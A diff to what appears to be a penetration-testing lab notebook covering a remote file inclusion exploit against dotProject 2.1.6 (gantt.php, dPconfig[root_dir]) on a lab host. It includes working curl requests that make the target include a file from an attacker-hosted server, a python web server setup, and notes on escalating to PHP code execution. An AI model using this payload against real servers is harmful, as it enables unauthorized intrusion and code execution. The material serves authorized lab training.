@@ -194,24 +194,51 @@ find / -name "proof.txt" 2>/dev/null
 
 ### Exploit lead — dotProject **≤ 2.1.6** RFI (`gantt.php` + `dPconfig[root_dir]`)
 
+**Chronological screenshots (`.102`):** new evidence uses **`102-NNN_…_tm6_afrocha.png`** (`NNN` increments per capture — **`102-001`** is the first in this sequence).
+
 ![searchsploit -x — dotProject 2.1.6 RFI, gantt.php, dPconfig root_dir](../Screenshots/searchsploit_dotproject_2_1_6_rfi_gantt_dPconfig_tm6_afrocha.png)
 
 | Field | Value |
 |-------|--------|
 | **Issue** | **Remote file inclusion** via **`$dPconfig['root_dir']`** used in **`include (...)`** in **`modules/projectdesigner/gantt.php`** (advisory snippet: line with **`jpgraph.php`** include). |
-| **PoC shape** | `http://<target>/dotproject/modules/projectdesigner/gantt.php?dPconfig[root_dir]=http://<your-host>/info.txt?` |
-| **PHP prerequisites** | **`register_globals = On`** (attacker supplies **`dPconfig`** via request) and **`allow_url_include = On`** (remote **`http://`** include). Many hardened hosts disable these; **PHP 5.3.x lab stacks** sometimes still match. |
+| **Target URI (this vuln)** | **`/dotproject/modules/projectdesigner/gantt.php`** — **not** Metasploit `TARGETURI` generically; this is the **HTTP path** for the RFI query below. |
+| **PoC shape** | `http://<target>/dotproject/modules/projectdesigner/gantt.php?dPconfig[root_dir]=http://<your-host>/marker.txt?` |
+| **PHP prerequisites** | **`register_globals = On`** and **`allow_url_include = On`**. If either is **Off**, the include will not work as written. |
 | **Why it fits `.102`** | Fingerprinted **dotProject 2.1.6** — in the affected range. |
 
-**Safe validation (recon-only):**
+![102-001 — curl -sI gantt.php → HTTP 200, script exists](../Screenshots/102-001_curl_gantt_si_200_tm6_afrocha.png)
+
+| Field | Value |
+|-------|--------|
+| **Command** | `curl -sI "http://$RHOST_102/dotproject/modules/projectdesigner/gantt.php"` |
+| **Result** | **HTTP/1.1 200 OK** — endpoint is reachable; **`Server:`** still **Apache 2.2.21** / **PHP 5.3.8**. |
+| **Stamp** | `echo TM6_afrocha; date` |
+
+**1 — Recon (headers only)**
 
 ```bash
-# Script present?
+export RHOST_102=10.20.160.102
 curl -sI "http://$RHOST_102/dotproject/modules/projectdesigner/gantt.php"
-# Optional: grep phpinfo / error pages elsewhere for register_globals / allow_url_include (if allowed)
+echo TM6_afrocha; date
 ```
 
-**If prerequisites likely and lab authorizes:** host a minimal **`info.txt`** (or staged payload per course rules) on **Kali**, replace **`<your-host>`** with **Kali IP**, watch **Apache/PHP** response and listener behavior — **read full `searchsploit -x`** for exact encoding and follow-on.
+**2 — RFI proof (lab-authorized only):** **`LHOST`** = Kali IP **reachable from `.102`** (lab/VPN interface).
+
+```bash
+export RHOST_102=10.20.160.102
+export LHOST=<KALI_IP>
+
+# Terminal A — serve a one-line marker (no PHP execution required for a first pass)
+mkdir -p ~/rfi_poc && printf 'RFI_MARKER_EPT\n' > ~/rfi_poc/marker.txt
+cd ~/rfi_poc && python3 -m http.server 8080 --bind 0.0.0.0
+
+# Terminal B — request includes remote file via dPconfig[root_dir] (trailing ? matches classic PoCs)
+curl -sik "http://${RHOST_102}/dotproject/modules/projectdesigner/gantt.php?dPconfig%5Broot_dir%5D=http://${LHOST}:8080/marker.txt?"
+```
+
+**Success signal:** response body contains **`RFI_MARKER_EPT`** (or obvious PHP **fatal** mentioning **`allow_url_include`**, **`Failed opening**`, **`http:// wrapper`**, which tells you the **`php.ini`** posture).
+
+**3 — If remote include works and course allows code execution:** host a **`<?php … ?>`** file on **`LHOST`** and repeat (only if **`allow_url_include`** allows execution — many configs do **not**); otherwise pivot to **LFI**/local tricks per **`searchsploit -x`**.
 
 ### Recon — `curl /cgi-bin` (404; headers + error body)
 
